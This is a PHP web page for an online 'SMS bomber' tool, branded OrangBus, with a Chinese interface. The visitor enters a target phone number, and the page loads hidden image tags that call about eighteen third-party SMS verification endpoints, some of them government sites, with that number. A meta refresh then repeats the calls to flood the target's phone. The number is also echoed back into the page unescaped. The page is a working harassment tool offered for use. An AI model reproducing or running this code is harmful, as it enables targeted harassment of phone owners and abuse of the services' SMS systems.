<?php
require './php/common.php';
?>
<!DOCTYPE html>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1">
<title><?php echo $conf['title']?></title>
<meta name="keywords" content="<?php echo $conf['keywords']?>">
<meta name="description" content="<?php echo $conf['description']?>">
<!-- Bootstrap -->
<link href="http://cdn.bootcss.com/bootstrap/3.2.0/css/bootstrap.css" rel="stylesheet">

<style>
	body{
		margin: 0 auto;
		text-align: center;
	}
	.container {
	  max-width: 580px;
	  padding: 15px;
	  margin: 0 auto;
	}
	.app-body{
	background-image: url(./static/chrome.jpg);
	background-attachment: fixed;
	background-repeat: no-repeat;
	background-size: cover;
	-moz-background-size: cover;
	}

	.container{
	    background-color: white;
	    border-radius: 0.6rem;
        margin-top: 10rem;
	}

</style>
</head>

<body class="app-body">
<div class="container">
	<div class="header">
        <ul class="nav nav-pills pull-right" role="tablist">
          <li role="presentation" class="active"><a href="index.php">短信轰炸</a></li>
          <li role="presentation"><a href="http://doc.orangbus.cn">博客</a></li>
        </ul>
        <h3 class="text-muted" align="left"><a href="https://orangbus.cn">OrangBus</a></h3>
     </div>
	<hr>
<div class="panel panel-primary" style="margin:1% 1% 1% 1%;background: rgba(255, 251, 251, 0.7)">
                <div class="panel-heading bk-bg-primary">
                    <h6><span class="panel-title">在线短信轰炸</span></h6>
                </div>
                <div class="panel-body">
				
				 <div class="input-group">
        <span class="input-group-addon">手机号</span>
		<form method="GET" action="index.php">
        <input type="text" name="hm" maxlength="11" class="form-control" placeholder="输入需要轰炸的号码" value="" />
    </div>
		<div id="pre_request"><br />
        <button type="submit" class="btn btn-danger" name="ok" onclick="ajaxRequest(0);">启动轰炸</button>
		<button type="button" class="btn btn-success" onclick="top.location='index.php'">停止线程</button>
		</div>
		</form>
<?php
error_reporting(0);
$v=$_GET['c'];
$a=$v+1;
$e=$a;
$d=$_GET['hm'];
?>
    
<div class="tip">
<?php
$i=13;//
if($i==$d){
   echo "<br><br><H4>0</H4>";
}
if($i!=$d and $d>1){
    echo"   <br /><div class='progress progress-striped active'><div class='progress-bar progress-bar-success' style='width: 100%'>轰炸进行中</div></div><div id='ajax_thread_msg'><div class='alert alert-success' style='margin-bottom: 0px;'>轰炸已经启动,  对<strong>$d</strong>,已经开始短信轰炸,请静静的等待1-5分钟查看效果，轰炸进行中请勿关闭页面</div></div>";
    echo "<div style='display:none'>
<img src='http://218.29.159.26:9000/website/smsSend?phoneNum=$d' alt=''/>
<img src='http://passport2.chaoxing.com/num/phonecode?phone=$d&needcode=false' alt=''/>
<img src='http://www.zjzxts.gov.cn/sendMsg.do?modelMethod=sendMessage&phonenum=$d' alt=''/>
<img src='http://member.cabplink.com/sso/sendRegisterSMS.zaction?mobile=$d' alt=''/>
<img src='http://www.jsvideo.tv/sendMsg?phone=$d' alt=''/>
<img src='http://app.jiayouxueba.cn/api/v3/sms/getcode?mobile=$d' alt=''/>
<img src='http://www.aipai.com/app/www/apps/ums.php?step=ums&mobile=$d' alt=''/>
<img src='https://www.guiji.ai/site/sms?type=2&mobile=$d' alt=''/>
<img src='http://app.syxwnet.com/?app=member&controller=index&action=sendMobileMessage&mobile=$d' alt=''/>
<img src='http://www.zjzxts.gov.cn/sendMsg.do?modelMethod=sendMessage&phonenum=$d' alt=''/>
<img src='http://www.jsvideo.tv/sendMsg?phone=$d' alt=''/>
<img src='http://api.passport.pptv.com/checkImageCodeAndSendMsg?&scene=REG_PPTV_APP&deviceId=867830021000533&aliasName=$d' alt=''/>
<img src='http://xinweixin.11183.com.cn/youzheng/login/security?phone=$d' alt=''/>
<img src='http://kyddn.log56.com/sq_server/verifyCode.action?mobile_no=$d' alt=''/>
<img src='https://user.zhaobiao.cn/ssologin.do?method=sendLoginCodeAjax&mobile=$d&hasSend=0' alt=''/>
<img src='http://user.daojia.com/mobile/getcode?mobile=$d' alt=''/>
<img src='https://www.guiji.ai/site/sms?type=2&mobile=$d' alt=''/>
<img src='http://member.cabplink.com/sso/sendRegisterSMS.zaction?mobile=$d' alt=''/>
</div>";
     echo"<meta http-equiv=refresh content='9999999999; url=index.php?hm=$d&amp;c=$a'>";
}

?> <br>
						
<?php echo $conf['gonggao']?>
				<hr><div class="container-fluid">
  <a href="https://github.com/orangbus/tool" class="btn btn-default"> Github</a>
  <a href="http://img.orangbus.cn" class="btn btn-info" style="margin-left:2rem">壁纸站</a>
</div>
<p style="text-align:center"><br>&copy; Powered by <a href="http://jybkw.cn/">玖云博客</a>!</p></div>
</body>
</html>